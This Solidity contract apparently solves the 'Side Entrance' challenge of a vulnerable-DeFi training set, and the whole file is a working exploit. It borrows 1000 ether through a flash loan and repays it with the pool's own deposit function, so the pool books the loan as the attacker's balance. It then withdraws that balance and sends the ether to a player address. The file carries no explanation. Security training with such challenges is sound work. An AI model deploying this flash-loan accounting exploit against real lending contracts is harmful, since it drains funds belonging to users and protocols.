// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool pool;
    address public player;

    constructor(address _pool, address _player) {
        pool = SideEntranceLenderPool(_pool);
        player = _player;
    }

    function attack() external payable {
        pool.flashLoan(1000 ether);
        pool.withdraw();

        player.call{value: 1000 ether}("");
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}